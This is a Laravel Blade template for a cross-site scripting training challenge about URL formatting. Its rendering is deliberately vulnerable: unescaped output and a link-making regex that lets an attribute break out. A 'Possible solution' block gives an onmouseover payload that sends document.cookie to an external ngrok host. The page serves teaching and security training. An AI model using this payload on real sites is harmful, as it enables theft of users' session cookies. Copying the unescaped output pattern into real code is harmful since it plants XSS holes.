<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Challenge</title>
    <style>
        body {
            background-color: #fff;
        }

        .fw {
            position: absolute;
            top: 0px;
            right: 0px;
            bottom: 0px;
            left: 0px;
            z-index: 1;
            overflow: hidden;
        }

        .ct {
            z-index: 10;
            position: relative;
        }
    </style>
</head>

<body>

    <p><a href="/day1/challenge4">Reset form</a></p>

    <h1>Formatting</h1>

    <p>Sometimes, we use user input to generate URLs. This can be dangerous if we don't escape the input properly. Let's
        see how we can format a URL safely.</p>

    <p>This is still vulnerable to attack. Can you see how?</p>


    <h2>Objective</h2>

    <ul>
        <li>Send the value of `document.cookie` to `GET
            https://3e36-51-52-158-78.ngrok-free.app/xss/four?cookie=COOKIE_PAYLOAD&name=YOUR_NAME`
        </li>
    </ul>
    <details>
        <summary>Possible solution</summary>
        <pre>
        https://bbc.co.uk"onmouseover="fetch('https://3e36-51-52-158-78.ngrok-free.app/xss/four?cookie=' + document.cookie)
    </pre>
    </details>


    <form method="POST">
        @csrf
        <p>Submit a URL and have it formatted appropriately below:</p>
        <div>
            <textarea type="text" name="search" id="description" style="width: 95%" placeholder="Search term">
                {!! strip_tags(request()->get('search')) !!}
            </textarea>
        </div>
        <p><button type="submit">Search!</button></p>
    </form>
    <h3>Formatted text</h3>
    <p>{!! preg_replace('/(https?:\/\/\S*)/i', '<a href="$1">$1</a>', strip_tags(request()->input('search'))) !!}</p>

    @if (request()->isMethod('POST'))
        <h3>Submitted Description:</h3>
        <p>{!! strip_tags(request()->input('search')) !!}</p>
    @endif

</body>

</html>
